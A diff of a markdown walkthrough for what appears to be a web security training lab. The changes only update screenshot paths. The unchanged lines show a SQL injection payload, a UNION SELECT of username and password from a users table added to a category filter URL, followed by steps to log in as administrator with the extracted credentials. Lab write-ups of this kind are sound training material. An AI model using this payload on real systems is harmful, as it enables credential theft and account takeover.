@@ -17,7 +17,7 @@ step 1
 
 send `/filter?category=Lifestyle` to the repeater
 
-![screnshot](./images/lab5_category_lifestyle.png)
+![screnshot](images/lab5_category_lifestyle.jpg)
 
 step 2
 
@@ -25,7 +25,7 @@ use `'+UNION+SELECT+username,+password+FROM+users--`
 payload will be
 `/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--`
 
-![screnshot](./images/lab5_username_password_from_user.png)
+![screnshot](images/lab5_username_password_from_user.jpg)
 
 step 3 
 
@@ -49,4 +49,4 @@ Note down user id and password
 login the account using
 administrator id  and password
 
-![screnshot](./images/lab5_solve_lab.png)
+![screnshot](images/lab5_solve_lab.jpg)
